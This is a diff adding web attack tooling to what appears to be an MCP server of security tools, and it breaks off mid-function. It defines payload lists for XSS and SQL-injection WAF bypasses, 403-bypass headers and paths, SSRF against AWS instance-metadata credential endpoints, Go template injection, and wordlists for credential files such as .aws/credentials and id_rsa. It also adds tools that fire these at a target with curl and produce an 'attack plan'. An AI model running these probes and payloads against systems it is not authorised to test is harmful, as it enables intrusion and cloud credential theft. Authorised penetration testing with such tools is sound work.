@@ -4951,6 +4951,769 @@ async def server_security_audit() -> str:
     return json.dumps(output, indent=2)
 
 
+
+# ============================================================================
+# ENHANCED MODULES — DEEP VULNERABILITY DETECTION
+# ============================================================================
+
+# --- Enhanced Payload Collections (AWS, Golang, WAF bypass, Cloud) ---
+
+class AdvancedPayloads:
+    """Advanced payload collections for deep detection per user analysis requirements."""
+    
+    @staticmethod
+    def aws_cloud_payloads() -> Dict[str, List[str]]:
+        """AWS-specific payloads for cloud infrastructure testing."""
+        return {
+            "s3_buckets": [
+                "s3://{target}-backup", "s3://{target}-prod", "s3://{target}-dev",
+                "s3://{target}-staging", "s3://{target}-assets", "s3://{target}-logs",
+                "s3://{target}-data", "s3://{target}-uploads", "s3://{target}-static",
+                "s3://backup-{target}", "s3://prod-{target}", "s3://dev-{target}",
+            ],
+            "metadata_endpoints": [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/user-data",
+                "http://169.254.169.254/latest/dynamic/instance-identity/document",
+                "http://169.254.170.2/v2/credentials",  # ECS task role
+                "http://fd00:ec2::254/latest/meta-data/",  # IPv6
+            ],
+            "aws_endpoints_to_fuzz": [
+                "/aws", "/s3", "/dynamodb", "/lambda", "/cloudformation",
+                "/cloudtrail", "/kms", "/iam", "/ec2", "/rds",
+                "/.aws/credentials", "/.aws/config",
+            ],
+            "cloudtrail_exposure": [
+                "/logs/cloudtrail/", "/var/log/cloudtrail/",
+                "/cloudtrail-logs/", "/audit-logs/",
+            ],
+        }
+    
+    @staticmethod
+    def golang_specific_payloads() -> Dict[str, List[str]]:
+        """Golang application specific payloads."""
+        return {
+            "debug_endpoints": [
+                "/debug/pprof/", "/debug/pprof/heap", "/debug/pprof/goroutine",
+                "/debug/pprof/threadcreate", "/debug/pprof/block", "/debug/pprof/mutex",
+                "/debug/pprof/profile", "/debug/pprof/trace",
+                "/debug/vars", "/debug/requests", "/debug/events",
+                "/metrics", "/healthz", "/readyz", "/livez",
+            ],
+            "framework_paths": [
+                "/routes", "/handlers", "/models", "/controllers",
+                "/api/internal", "/internal/", "/private/",
+            ],
+            "file_extensions": [".go", ".mod", ".sum", ".toml"],
+            "ssti_golang": [
+                "{{.}}", "{{len .}}", "{{printf \"%s\" .}}",
+                "{{range .}}{{.}}{{end}}", '{{define "T"}}{{end}}',
+            ],
+        }
+    
+    @staticmethod
+    def waf_bypass_payloads() -> Dict[str, List[str]]:
+        """WAF bypass techniques for common WAFs."""
+        return {
+            "case_variation": [
+                "<ScRiPt>alert(1)</ScRiPt>", "<SCRIPT>alert(1)</SCRIPT>",
+                "<scRIPT>alert(1)</scRIPT>",
+            ],
+            "encoding_bypass": [
+                "%3Cscript%3Ealert(1)%3C/script%3E",
+                "%253Cscript%253Ealert(1)%253C%252Fscript%253E",  # double encode
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # unicode
+            ],
+            "null_byte_bypass": [
+                "<scri%00pt>alert(1)</scri%00pt>",
+                "admin%00.php", "/etc/passwd%00.jpg",
+            ],
+            "header_bypass_403": [
+                "X-Original-URL: /admin",
+                "X-Rewrite-URL: /admin",
+                "X-Forwarded-For: 127.0.0.1",
+                "X-Forwarded-Host: localhost",
+                "X-Custom-IP-Authorization: 127.0.0.1",
+                "X-Real-IP: 127.0.0.1",
+                "X-Remote-IP: 127.0.0.1",
+                "X-Client-IP: 127.0.0.1",
+                "X-Host: 127.0.0.1",
+                "X-Originating-IP: 127.0.0.1",
+                "True-Client-IP: 127.0.0.1",
+            ],
+            "path_bypass_403": [
+                "/admin", "/ADMIN", "/Admin", "/aDmIn",
+                "/%61dmin", "/%2Fadmin", "/%252Fadmin",
+                "/admin%00", "/admin%20", "/admin%09",
+                "/admin/.", "/admin/./", "/./admin/",
+                "/admin..;/", "//admin", "/admin//",
+                "/admin%c0%af", "/admin;/",
+            ],
+            "method_bypass": ["TRACE", "OPTIONS", "CONNECT", "PATCH", "PROPFIND"],
+            "sqli_waf_bypass": [
+                "/*!50000UNION*/+/*!50000SELECT*/+1,2,3",
+                "UNION%0aSELECT%0a1,2,3",
+                "uNiOn+sElEcT+1,2,3",
+                "' AND 1=1#", "' AND 1=1-- -",
+                "'+UNION+ALL+SELECT+NULL,NULL,NULL--+-",
+            ],
+        }
+    
+    @staticmethod
+    def config_files_wordlist() -> List[str]:
+        """Sensitive configuration files to discover."""
+        return [
+            ".env", ".env.local", ".env.production", ".env.staging", ".env.backup",
+            "config.php", "config.yml", "config.yaml", "config.json", "config.xml",
+            "settings.py", "settings.json", "settings.yml",
+            "secrets.yaml", "secrets.json", "secrets.yml",
+            "credentials.json", "credentials.yml",
+            ".git/config", ".git/HEAD", ".gitignore",
+            ".svn/entries", ".hg/hgrc",
+            "web.config", "appsettings.json", "appsettings.Development.json",
+            "docker-compose.yml", "docker-compose.override.yml",
+            "Dockerfile", ".dockerignore",
+            "package.json", "package-lock.json", "yarn.lock",
+            "composer.json", "composer.lock",
+            "Gemfile", "Gemfile.lock",
+            "requirements.txt", "Pipfile", "Pipfile.lock",
+            "go.mod", "go.sum",
+            ".htaccess", ".htpasswd",
+            "robots.txt", "sitemap.xml",
+            "crossdomain.xml", "clientaccesspolicy.xml",
+            "phpinfo.php", "info.php", "test.php",
+            "backup.sql", "dump.sql", "database.sql",
+            "id_rsa", "id_rsa.pub", ".ssh/authorized_keys",
+            "wp-config.php", "wp-config.php.bak",
+            "/actuator", "/actuator/env", "/actuator/health",
+            "/swagger.json", "/swagger-ui.html", "/api-docs",
+            "/openapi.json", "/v2/api-docs", "/v3/api-docs",
+        ]
+    
+    @staticmethod
+    def sensitive_dirs_wordlist() -> List[str]:
+        """Critical directories to enumerate."""
+        return [
+            ".git", ".svn", ".hg", ".bzr",
+            "node_modules", "vendor", "src", "lib",
+            "backup", "backups", "bak", "old", "temp", "tmp",
+            "admin", "administrator", "panel", "dashboard", "cp",
+            "api", "api/v1", "api/v2", "api/v3", "api/internal",
+            "graphql", "graphiql",
+            "debug", "test", "testing", "staging", "dev",
+            "private", "internal", "secret", "hidden",
+            "uploads", "files", "documents", "media", "assets",
+            "cgi-bin", "scripts", "includes",
+            "phpmyadmin", "pma", "adminer", "dbadmin",
+            "wp-admin", "wp-includes", "wp-content",
+            "console", "terminal", "shell",
+        ]
+
+
+@mcp.tool()
+@resolve_references
+async def smart_vulnerability_detector(
+    target: str, 
+    scan_depth: str = "standard",
+    focus_areas: str = "all",
+    timeout: int = 300
+) -> str:
+    """
+    Intelligent vulnerability detector that analyzes HTTP responses for critical patterns.
+    Detects: RCE indicators, Auth bypass, Data leaks, Misconfigurations.
+    Focus areas: all, rce, auth_bypass, data_leak, misconfig, cloud, injection
+    Scan depth: quick, standard, deep
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("smart_vulnerability_detector", target, 10)
+    inputs = {"target": target, "scan_depth": scan_depth, "focus_areas": focus_areas}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    findings = []
+    
+    # Step 1: Baseline HTTP analysis
+    progress.update("Baseline HTTP analysis", "Probing target")
+    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
+    baseline = run_command_advanced(baseline_cmd, timeout=30, trace=trace)
+    headers_raw = baseline["stdout"].lower()
+    
+    # Step 2: Technology fingerprinting from headers
+    progress.update("Technology fingerprinting")
+    tech_indicators = {
+        "golang": ["x-powered-by: go", "server: go", "content-type: application/json"],
+        "aws": ["x-amzn-", "x-amz-", "server: amazons3", "server: awselb", "via: cloudfront"],
+        "nginx": ["server: nginx"],
+        "apache": ["server: apache"],
+        "cloudflare": ["server: cloudflare", "cf-ray"],
+        "express": ["x-powered-by: express"],
+    }
+    detected_stack = []
+    for tech, indicators in tech_indicators.items():
+        if any(ind in headers_raw for ind in indicators):
+            detected_stack.append(tech)
+    
+    # Step 3: Critical endpoint probing
+    progress.update("Critical endpoint probing")
+    critical_paths = [
+        "/.env", "/.git/config", "/debug/pprof/", "/actuator/env",
+        "/swagger.json", "/api-docs", "/.aws/credentials",
+        "/server-status", "/server-info", "/.well-known/security.txt",
+        "/robots.txt", "/sitemap.xml", "/wp-config.php.bak",
+    ]
+    
+    if "golang" in detected_stack:
+        critical_paths.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
+    if "aws" in detected_stack:
+        critical_paths.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
+    
+    exposed_endpoints = []
+    for path in critical_paths[:30]:  # Limit to avoid timeout
+        probe_url = f"{url.rstrip('/')}{path}"
+        probe_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", probe_url]
+        probe_result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
+        status_code = probe_result["stdout"].strip()
+        if status_code in ["200", "301", "302", "401", "403", "405"]:
+            exposed_endpoints.append({"path": path, "status": status_code})
+            if status_code == "200":
+                findings.append({
+                    "type": "EXPOSED_ENDPOINT", "severity": "HIGH",
+                    "path": path, "status": status_code,
+                    "detail": f"Endpoint accessible: {path}"
+                })
+    
+    # Step 4: 403 bypass testing
+    progress.update("403 bypass testing")
+    forbidden_paths = [ep for ep in exposed_endpoints if ep["status"] == "403"]
+    bypass_headers = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
+    
+    for forbidden in forbidden_paths[:5]:
+        for header in bypass_headers[:6]:
+            h_name, h_value = header.split(": ", 1)
+            bypass_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
+                         "-H", f"{h_name}: {h_value}", f"{url.rstrip('/')}{forbidden['path']}"]
+            bypass_result = run_command_advanced(bypass_cmd, timeout=12, trace=trace)
+            if bypass_result["stdout"].strip() == "200":
+                findings.append({
+                    "type": "403_BYPASS", "severity": "CRITICAL",
+                    "path": forbidden["path"], "bypass_header": header,
+                    "detail": f"403 bypassed with {h_name} header"
+                })
+                break
+    
+    # Step 5: Information disclosure via error pages
+    progress.update("Information disclosure analysis")
+    error_triggers = [
+        f"{url}/{'A' * 500}", f"{url}/%00", f"{url}/\x00",
+        f"{url}/?debug=true", f"{url}/?test=1&__debug=1",
+    ]
+    for trigger in error_triggers:
+        err_cmd = ["curl", "-sk", "--max-time", "8", trigger]
+        err_result = run_command_advanced(err_cmd, timeout=12, trace=trace)
+        body = err_result["stdout"]
+        # Check for stack traces, file paths, version info
+        leak_patterns = [
+            ("STACK_TRACE", r"(?:at |File |Traceback|goroutine|panic:)"),
+            ("FILE_PATH", r"(?:/usr/|/var/|/home/|/opt/|/app/|/src/)"),
+            ("VERSION_LEAK", r"(?:version|v\d+\.\d+|go\d+\.\d+)"),
+            ("DB_ERROR", r"(?:SQL|mysql|postgres|sqlite|ORM|GORM)"),
+            ("SECRET_LEAK", r"(?:api_key|secret|password|token|aws_)"),
+        ]
+        for leak_type, pattern in leak_patterns:
+            if re.search(pattern, body, re.IGNORECASE):
+                findings.append({
+                    "type": f"INFO_DISCLOSURE_{leak_type}", "severity": "HIGH",
+                    "trigger": trigger[:100],
+                    "detail": f"Information leak detected: {leak_type}"
+                })
+                break
+    
+    # Step 6: SSRF via cloud metadata (if AWS detected)
+    progress.update("Cloud metadata SSRF testing")
+    if "aws" in detected_stack or focus_areas in ["all", "cloud"]:
+        metadata_urls = AdvancedPayloads.aws_cloud_payloads()["metadata_endpoints"]
+        for meta_url in metadata_urls[:4]:
+            # Try common SSRF params
+            for param in ["url", "redirect", "uri", "path", "next", "link", "proxy"]:
+                ssrf_url = f"{url}/?{param}={meta_url}"
+                ssrf_cmd = ["curl", "-sk", "--max-time", "10", ssrf_url]
+                ssrf_result = run_command_advanced(ssrf_cmd, timeout=15, trace=trace)
+                if any(x in ssrf_result["stdout"] for x in ["iam", "instance-id", "ami-id", "security-credentials"]):
+                    findings.append({
+                        "type": "SSRF_CLOUD_METADATA", "severity": "CRITICAL",
+                        "param": param, "payload": meta_url,
+                        "detail": "AWS metadata accessible via SSRF!"
+                    })
+    
+    # Step 7: Security header analysis (deep)
+    progress.update("Deep security header analysis")
+    header_issues = []
+    if "strict-transport-security" not in headers_raw:
+        header_issues.append({"header": "HSTS", "severity": "MEDIUM", "detail": "Missing HSTS header"})
+    if "content-security-policy" not in headers_raw:
+        header_issues.append({"header": "CSP", "severity": "MEDIUM", "detail": "Missing CSP header"})
+    elif "unsafe-inline" in headers_raw or "unsafe-eval" in headers_raw:
+        header_issues.append({"header": "CSP", "severity": "HIGH", "detail": "CSP allows unsafe-inline/eval"})
+    if "x-frame-options" not in headers_raw:
+        header_issues.append({"header": "X-Frame-Options", "severity": "MEDIUM", "detail": "Clickjacking possible"})
+    if "x-content-type-options" not in headers_raw:
+        header_issues.append({"header": "X-Content-Type-Options", "severity": "LOW", "detail": "MIME sniffing possible"})
+    for issue in header_issues:
+        findings.append({"type": "HEADER_SECURITY", **issue})
+    
+    # Step 8: Method enumeration
+    progress.update("HTTP method enumeration")
+    options_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url]
+    options_result = run_command_advanced(options_cmd, timeout=15, trace=trace)
+    allowed_methods = []
+    for line in options_result["stdout"].split("\n"):
+        if "allow:" in line.lower():
+            allowed_methods = [m.strip() for m in line.split(":", 1)[1].split(",")]
+    dangerous_methods = [m for m in allowed_methods if m.upper() in ["PUT", "DELETE", "TRACE", "CONNECT"]]
+    if dangerous_methods:
+        findings.append({
+            "type": "DANGEROUS_METHODS", "severity": "HIGH",
+            "methods": dangerous_methods,
+            "detail": f"Dangerous HTTP methods allowed: {dangerous_methods}"
+        })
+    
+    # Step 9: Generate severity summary
+    progress.update("Generating report")
+    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+    for f in findings:
+        sev = f.get("severity", "INFO")
+        severity_counts[sev] = severity_counts.get(sev, 0) + 1
+    
+    output = {
+        "status": "success",
+        "target": target,
+        "detected_stack": detected_stack,
+        "scan_depth": scan_depth,
+        "total_findings": len(findings),
+        "severity_summary": severity_counts,
+        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
+        "high_findings": [f for f in findings if f.get("severity") == "HIGH"],
+        "medium_findings": [f for f in findings if f.get("severity") == "MEDIUM"],
+        "exposed_endpoints": exposed_endpoints,
+        "all_findings": findings,
+        "recommendations": _generate_smart_recommendations(findings, detected_stack),
+    }
+    
+    progress.update("Complete")
+    output = chain_engine.enrich_with_context("smart_vulnerability_detector", target, output)
+    log_tool_execution("smart_vulnerability_detector", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+def _generate_smart_recommendations(findings: List[Dict], stack: List[str]) -> List[str]:
+    """Generate actionable recommendations based on findings."""
+    recs = []
+    finding_types = [f.get("type", "") for f in findings]
+    
+    if any("SSRF" in t for t in finding_types):
+        recs.append("CRITICAL: SSRF detected - investigate cloud metadata access, check IAM roles")
+    if any("403_BYPASS" in t for t in finding_types):
+        recs.append("CRITICAL: 403 bypass found - access control misconfiguration confirmed")
+    if any("EXPOSED_ENDPOINT" in t for t in finding_types):
+        recs.append("HIGH: Sensitive endpoints exposed - review access controls immediately")
+    if any("INFO_DISCLOSURE" in t for t in finding_types):
+        recs.append("HIGH: Information leaking via error pages - implement custom error handlers")
+    if "golang" in stack:
+        recs.append("STACK: Golang detected - test /debug/pprof, check template injection {{.}}")
+    if "aws" in stack:
+        recs.append("STACK: AWS detected - enumerate S3 buckets, test SSRF to metadata service")
+    if not recs:
+        recs.append("No critical findings in quick scan - recommend deep scan with scan_depth='deep'")
+    return recs
+
+
+@mcp.tool()
+@resolve_references
+async def context_fuzzer(
+    target: str,
+    mode: str = "smart",
+    wordlist_type: str = "auto",
+    follow_redirects: bool = True,
+    timeout: int = 300
+) -> str:
+    """
+    Context-aware fuzzer that analyzes 403/422/401 responses to discover hidden endpoints.
+    Modes: smart (auto-detect stack and adapt), aggressive (all techniques), stealth (slow + evasive)
+    Wordlist types: auto, golang, aws, api, config, full
+    Uses responses to intelligently adapt fuzzing strategy.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("context_fuzzer", target, 8)
+    inputs = {"target": target, "mode": mode, "wordlist_type": wordlist_type}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    discovered = []
+    
+    # Step 1: Baseline + stack detection
+    progress.update("Baseline analysis", "Detecting target stack")
+    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
+    baseline = run_command_advanced(baseline_cmd, timeout=20, trace=trace)
+    
+    # Auto-detect wordlist based on stack
+    detected_tech = []
+    headers_lower = baseline["stdout"].lower()
+    if any(x in headers_lower for x in ["go", "golang", "gin", "echo", "fiber"]):
+        detected_tech.append("golang")
+    if any(x in headers_lower for x in ["x-amzn", "x-amz", "cloudfront", "awselb"]):
+        detected_tech.append("aws")
+    if any(x in headers_lower for x in ["express", "node", "x-powered-by: express"]):
+        detected_tech.append("node")
+    if any(x in headers_lower for x in ["php", "laravel", "symfony"]):
+        detected_tech.append("php")
+    
+    # Step 2: Build smart wordlist
+    progress.update("Building adaptive wordlist")
+    wordlist = []
+    
+    # Always include sensitive files
+    wordlist.extend(AdvancedPayloads.config_files_wordlist())
+    wordlist.extend(AdvancedPayloads.sensitive_dirs_wordlist())
+    
+    # Stack-specific additions
+    if "golang" in detected_tech or wordlist_type in ["golang", "full"]:
+        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
+        wordlist.extend(AdvancedPayloads.golang_specific_payloads()["framework_paths"])
+    if "aws" in detected_tech or wordlist_type in ["aws", "full"]:
+        wordlist.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
+    
+    # API-specific paths
+    api_paths = [
+        "/api", "/api/v1", "/api/v2", "/api/v3", "/api/internal",
+        "/graphql", "/graphiql", "/playground",
+        "/rest", "/rpc", "/ws", "/websocket",
+        "/health", "/status", "/info", "/version",
+    ]
+    wordlist.extend(api_paths)
+    
+    # Deduplicate
+    wordlist = list(dict.fromkeys(wordlist))
+    
+    # Step 3: Fuzz with response analysis
+    progress.update("Fuzzing endpoints", f"{len(wordlist)} paths to test")
+    response_map = {"200": [], "301": [], "302": [], "401": [], "403": [], "405": [], "422": [], "500": []}
+    
+    for path in wordlist[:100]:  # Limit to prevent timeout
+        fuzz_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
+        fuzz_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
+                   "-w", "%{http_code}|%{size_download}", fuzz_url]
+        fuzz_result = run_command_advanced(fuzz_cmd, timeout=10, trace=trace)
+        parts = fuzz_result["stdout"].strip().split("|")
+        if len(parts) == 2:
+            code, size = parts[0], parts[1]
+            if code in response_map:
+                response_map[code].append({"path": path, "size": size})
+            if code in ["200", "301", "302"]:
+                discovered.append({"path": path, "status": code, "size": size, "type": "accessible"})
+            elif code == "401":
+                discovered.append({"path": path, "status": code, "size": size, "type": "auth_required"})
+            elif code == "403":
+                discovered.append({"path": path, "status": code, "size": size, "type": "forbidden"})
+            elif code == "405":
+                discovered.append({"path": path, "status": code, "size": size, "type": "method_not_allowed"})
+            elif code == "422":
+                discovered.append({"path": path, "status": code, "size": size, "type": "param_required"})
+    
+    # Step 4: 403 bypass attempts
+    progress.update("403 bypass testing")
+    bypass_results = []
+    forbidden_endpoints = response_map.get("403", [])[:5]
+    bypass_techniques = AdvancedPayloads.waf_bypass_payloads()["path_bypass_403"]
+    
+    for endpoint in forbidden_endpoints:
+        original_path = endpoint["path"]
+        for bypass_path in bypass_techniques[:8]:
+            # Replace /admin with the bypass variant
+            test_path = bypass_path.replace("/admin", f"/{original_path.strip('/')}")
+            test_url = f"{url.rstrip('/')}{test_path}"
+            bypass_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", test_url]
+            bypass_result = run_command_advanced(bypass_cmd, timeout=10, trace=trace)
+            if bypass_result["stdout"].strip() in ["200", "301", "302"]:
+                bypass_results.append({
+                    "original_path": original_path,
+                    "bypass_path": test_path,
+                    "status": bypass_result["stdout"].strip(),
+                    "severity": "CRITICAL"
+                })
+                break
+    
+    # Step 5: Header-based 403 bypass
+    progress.update("Header bypass testing")
+    header_bypasses = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
+    for endpoint in forbidden_endpoints[:3]:
+        for header in header_bypasses[:5]:
+            h_name, h_val = header.split(": ", 1)
+            hdr_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
+            hdr_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}",
+                      "-H", f"{h_name}: {h_val}", hdr_url]
+            hdr_result = run_command_advanced(hdr_cmd, timeout=10, trace=trace)
+            if hdr_result["stdout"].strip() == "200":
+                bypass_results.append({
+                    "original_path": endpoint["path"],
+                    "bypass_header": header,
+                    "status": "200",
+                    "severity": "CRITICAL"
+                })
+                break
+    
+    # Step 6: Method probing on 405 endpoints
+    progress.update("Method probing on 405 endpoints")
+    method_discoveries = []
+    method_endpoints = response_map.get("405", [])[:5]
+    http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
+    
+    for endpoint in method_endpoints:
+        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
+        for method in http_methods:
+            method_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null",
+                         "-w", "%{http_code}", "-X", method, ep_url]
+            method_result = run_command_advanced(method_cmd, timeout=10, trace=trace)
+            code = method_result["stdout"].strip()
+            if code not in ["405", "404", "000"]:
+                method_discoveries.append({
+                    "path": endpoint["path"], "method": method, "status": code
+                })
+    
+    # Step 7: Parameter discovery on 422 endpoints
+    progress.update("Parameter discovery on 422 endpoints")
+    param_discoveries = []
+    param_endpoints = response_map.get("422", [])[:3]
+    common_params = ["id", "user", "email", "name", "token", "key", "q", "search", "page", "limit",
+                    "admin", "debug", "action", "type", "format", "callback"]
+    
+    for endpoint in param_endpoints:
+        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
+        for param in common_params:
+            param_url = f"{ep_url}?{param}=test"
+            param_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", param_url]
+            param_result = run_command_advanced(param_cmd, timeout=10, trace=trace)
+            code = param_result["stdout"].strip()
+            if code != "422":  # Different response = param accepted
+                param_discoveries.append({
+                    "path": endpoint["path"], "param": param,
+                    "status_without": "422", "status_with": code
+                })
+    
+    progress.update("Complete")
+    output = {
+        "status": "success",
+        "target": target,
+        "detected_stack": detected_tech,
+        "mode": mode,
+        "total_discovered": len(discovered),
+        "discovered_endpoints": discovered,
+        "accessible_200": response_map.get("200", []),
+        "auth_required_401": response_map.get("401", []),
+        "forbidden_403": response_map.get("403", []),
+        "method_denied_405": response_map.get("405", []),
+        "param_required_422": response_map.get("422", []),
+        "bypass_results": bypass_results,
+        "method_discoveries": method_discoveries,
+        "param_discoveries": param_discoveries,
+        "recommendations": [
+            f"Discovered {len(discovered)} endpoints total",
+            f"Found {len(bypass_results)} 403 bypasses" if bypass_results else "No 403 bypasses found",
+            f"Found {len(method_discoveries)} method variations" if method_discoveries else "No method variations",
+            f"Found {len(param_discoveries)} parameter hints" if param_discoveries else "No param hints",
+        ],
+    }
+    
+    output = chain_engine.enrich_with_context("context_fuzzer", target, output)
+    log_tool_execution("context_fuzzer", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+@resolve_references
+async def target_profiler(
+    target: str,
+    profile_depth: str = "standard",
+    timeout: int = 120
+) -> str:
+    """
+    Profiles target technology stack and generates customized attack vectors.
+    Creates stack-specific payloads (Golang, AWS, Node, PHP, Java, .NET).
+    Returns prioritized attack plan based on detected technologies.
+    """
+    target = InputValidator.sanitize_target(target)
+    trace, progress, exec_dir = _init_tool_context("target_profiler", target, 6)
+    inputs = {"target": target, "profile_depth": profile_depth}
+    
+    url = target if target.startswith("http") else f"https://{target}"
+    
+    # Step 1: Multi-probe technology detection
+    progress.update("Multi-probe technology detection")
+    probes = {
+        "headers": ["curl", "-skI", "--max-time", "15", "-L", url],
+        "body": ["curl", "-sk", "--max-time", "15", "-L", url],
+        "error_404": ["curl", "-sk", "--max-time", "10", f"{url}/nonexistent_path_xyz123"],
+        "options": ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url],
+    }
+    
+    probe_results = {}
+    for name, cmd in probes.items():
+        result = run_command_advanced(cmd, timeout=20, trace=trace)
+        probe_results[name] = result["stdout"]
+    
+    # Step 2: Stack identification
+    progress.update("Stack identification")
+    all_content = " ".join(probe_results.values()).lower()
+    
+    profile = {
+        "web_server": None,
+        "language": None,
+        "framework": None,
+        "cloud_provider": None,
+        "waf": None,
+        "cms": None,
+        "api_type": None,
+        "database_hints": [],
+        "confidence": {},
+    }
+    
+    # Web server detection
+    server_patterns = {
+        "nginx": "server: nginx", "apache": "server: apache",
+        "iis": "server: microsoft-iis", "caddy": "server: caddy",
+        "gunicorn": "server: gunicorn", "uvicorn": "server: uvicorn",
+    }
+    for srv, pattern in server_patterns.items():
+        if pattern in all_content:
+            profile["web_server"] = srv
+            break
+    
+    # Language detection
+    lang_indicators = {
+        "golang": ["x-powered-by: go", "server: go", "goroutine", "gin-gonic", "echo", "fiber"],
+        "python": ["x-powered-by: python", "django", "flask", "fastapi", "gunicorn", "uvicorn"],
+        "php": ["x-powered-by: php", ".php", "laravel", "symfony", "codeigniter"],
+        "java": ["x-powered-by: java", "jsessionid", "spring", "tomcat", "jetty"],
+        "node": ["x-powered-by: express", "node", "next.js", "nuxt"],
+        "ruby": ["x-powered-by: ruby", "rails", "sinatra", "puma"],
+        "dotnet": ["x-powered-by: asp.net", "x-aspnet-version", ".aspx", "blazor"],
+    }
+    for lang, indicators in lang_indicators.items():
+        if any(ind in all_content for ind in indicators):
+            profile["language"] = lang
+            profile["confidence"]["language"] = "high"
+            break
+    
+    # Cloud provider detection
+    cloud_patterns = {
+        "aws": ["x-amzn-", "x-amz-", "amazons3", "awselb", "cloudfront", "amazonaws"],
+        "gcp": ["x-goog-", "google cloud", "gfe", "appengine"],
+        "azure": ["x-ms-", "azure", "windows-azure", "trafficmanager"],
+        "cloudflare": ["cf-ray", "server: cloudflare"],
+    }
+    for cloud, patterns in cloud_patterns.items():
+        if any(p in all_content for p in patterns):
+            profile["cloud_provider"] = cloud
+            break
+    
+    # WAF detection
+    waf_patterns = {
+        "cloudflare": ["cf-ray", "server: cloudflare"],
+        "aws_waf": ["x-amzn-waf", "awswaf"],
+        "modsecurity": ["mod_security", "modsecurity"],
+        "imperva": ["incap_ses", "x-iinfo"],
+        "akamai": ["akamai", "x-akamai"],
+        "f5": ["x-wa-info", "bigip"],
+    }
+    for waf, patterns in waf_patterns.items():
+        if any(p in all_content for p in patterns):
+            profile["waf"] = waf
+            break
+    
+    # Step 3: Generate stack-specific attack vectors
+    progress.update("Generating attack vectors")
+    attack_vectors = []
+    
+    if profile["language"] == "golang":
+        attack_vectors.extend([
+            {"vector": "Golang debug endpoints", "paths": ["/debug/pprof/", "/debug/vars", "/metrics"],
+             "severity": "HIGH", "category": "info_disclosure"},
+            {"vector": "Golang template injection", "payloads": ["{{.}}", "{{printf \"%v\" .}}"],
+             "severity": "CRITICAL", "category": "ssti"},
+            {"vector": "Golang race condition", "detail": "Test concurrent requests on state-changing endpoints",
+             "severity": "HIGH", "category": "logic"},
+        ])
+    
+    if profile["language"] == "python":
+        attack_vectors.extend([
+            {"vector": "Python debug mode", "paths": ["/debug", "/?__debugger__=yes"],
+             "severity": "HIGH", "category": "info_disclosure"},
+            {"vector": "Jinja2 SSTI", "payloads": ["{{7*7}}", "{{config}}", "{{request.environ}}"],
+             "severity": "CRITICAL", "category": "ssti"},
+        ])
+    
+    if profile["language"] == "php":
+        attack_vectors.extend([
+            {"vector": "PHP info disclosure", "paths": ["/phpinfo.php", "/info.php"],
+             "severity": "HIGH", "category": "info_disclosure"},
+            {"vector": "PHP type juggling", "detail": "Test == vs === in auth",
+             "severity": "HIGH", "category": "auth_bypass"},
+        ])
+    
+    if profile["cloud_provider"] == "aws":
+        attack_vectors.extend([
+            {"vector": "AWS metadata SSRF", "payloads": ["http://169.254.169.254/latest/meta-data/"],
+             "severity": "CRITICAL", "category": "ssrf"},
+            {"vector": "S3 bucket enumeration", "detail": "Test common bucket naming patterns",
+             "severity": "HIGH", "category": "cloud"},
+            {"vector": "AWS credentials exposure", "paths": ["/.aws/credentials", "/.env"],
+             "severity": "CRITICAL", "category": "credentials"},
+        ])
+    
+    if profile["waf"]:
+        waf_bypasses = AdvancedPayloads.waf_bypass_payloads()
+        attack_vectors.append({
+            "vector": f"WAF bypass ({profile['waf']})",
+            "techniques": list(waf_bypasses.keys()),
+            "severity": "HIGH", "category": "waf_bypass"
+        })
+    
+    # Step 4: Priority ranking
+    progress.update("Priority ranking")
+    # Sort by severity
+    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
+    attack_vectors.sort(key=lambda x: severity_order.get(x.get("severity", "LOW"), 4))
+    
+    # Step 5: Generate recommended tool chain
+    progress.update("Generating tool chain recommendations")
+    recommended_tools = []
+    if profile["cloud_provider"] == "aws":
+        recommended_tools.extend(["ssrf_scanner", "context_fuzzer", "smart_vulnerability_detector"])
+    if profile["language"]:
+        recommended_tools.extend(["ssti_scanner", "nuclei_scan", "api_endpoint_discovery"])
+    if profile["waf"]:
+        recommended_tools.extend(["waf_fingerprint", "context_fuzzer"])
+    recommended_tools.extend(["header_security_audit", "cors_scanner"])
+    
+    output = {
